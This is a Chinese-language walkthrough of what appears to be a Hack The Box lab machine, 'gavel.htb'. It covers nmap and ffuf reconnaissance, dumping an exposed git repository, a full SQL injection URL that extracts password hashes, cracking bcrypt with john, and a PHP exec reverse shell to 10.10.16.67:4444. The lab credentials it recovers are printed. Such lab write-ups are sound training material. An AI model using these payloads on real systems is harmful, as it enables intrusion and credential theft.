
<img width="1271" height="497" alt="Image" src="https://github.com/user-attachments/assets/69bbec0b-4b64-4fa6-a946-a7e8c011931d" />

nmap -sC -sV 10.129.242.203

echo 10.129.242.203 gavel.htb >> /etc/hosts

开放了22和80端口

<img width="482" height="236" alt="Image" src="https://github.com/user-attachments/assets/e1487b50-152e-41c5-88c1-45189155271a" />

访问web页面

<img width="912" height="449" alt="Image" src="https://github.com/user-attachments/assets/d47ff662-292e-49b9-8ffa-caba8e0d898b" />

来一手目录扫描
-e 参数 扫.php后缀

ffuf -u http://gavel.htb//FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php

<img width="587" height="503" alt="Image" src="https://github.com/user-attachments/assets/b3f5fa90-70be-4201-b771-f1a9e675277f" />

还泄露了一个git目录
利用git-dumper下载

git-dumper http://gavel.htb/.git/ ./gavel-source

<img width="467" height="351" alt="Image" src="https://github.com/user-attachments/assets/69d28f61-c57e-4874-8e57-6590787aafce" />

<img width="346" height="180" alt="Image" src="https://github.com/user-attachments/assets/04510ab8-03e9-4260-89f3-d370a330fbe8" />

分析admin.php
代码中判断了它是否是auctioneer用户
我们应该是要先拿到auctioneer的权限

<img width="491" height="315" alt="Image" src="https://github.com/user-attachments/assets/9e26008c-f6c6-45dc-bed7-c4220b7b8e98" />
inventory.php存在sql注入漏洞
sort参数和user_id参数

<img width="720" height="192" alt="Image" src="https://github.com/user-attachments/assets/e3476558-709e-4bb6-9ffd-f2cf38a566f1" />

SQL注入Payload

http://gavel.htb/inventory.php?user_id=x`+FROM+(SELECT+group_concat(username,0x3a,password)+AS+`%27x`+FROM+users)y;--+-&sort=\?;--+-%00

拿到了auctioneer的密码hash

auctioneer:$2y$10$MNkDHV6g16FjW/lAQRpLiuQXN4MVkdMuILn0pLQlC2So9SgH5RTfS

<img width="702" height="290" alt="Image" src="https://github.com/user-attachments/assets/c2ee16b8-bb45-417b-978e-903f482f077c" />

利用john破解hash
john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

auctioneer：midnight1

<img width="459" height="152" alt="Image" src="https://github.com/user-attachments/assets/9d024680-eb0c-4255-bb3d-91da00b7e4b2" />

在rule处填写反弹shell命令

<img width="711" height="576" alt="Image" src="https://github.com/user-attachments/assets/1b64739a-faa7-40ed-9760-c7a3075565cf" />

<img width="687" height="543" alt="Image" src="https://github.com/user-attachments/assets/5c20669c-28ab-4f99-b908-0297ffbcf164" />

本地监听4444端口，等待shell回连

exec("bash -c 'bash -i >& /dev/tcp/10.10.16.67/4444 0>&1'"); return true;

<img width="446" height="180" alt="Image" src="https://github.com/user-attachments/assets/2d6a65cf-fed5-4448-83dd-9bc7b6024f64" />

之前获取到的账号密码可以登录到ssh

auctioneer：midnight1

拿到userflag

<img width="537" height="416" alt="Image" src="https://github.com/user-attachments/assets/7a15be0d-e8ee-4dd6-b950-dca02058a1aa" />

